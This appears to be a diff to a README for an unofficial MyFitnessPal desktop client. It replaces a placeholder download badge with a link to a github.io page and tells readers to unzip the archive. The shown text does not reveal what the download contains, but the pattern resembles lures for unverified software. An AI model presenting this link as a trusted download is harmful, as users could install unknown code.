@@ -6,7 +6,7 @@ This unofficial MyFitnessPal desktop client brings the popular nutrition and fit
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://myfitnesspal-desktop-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
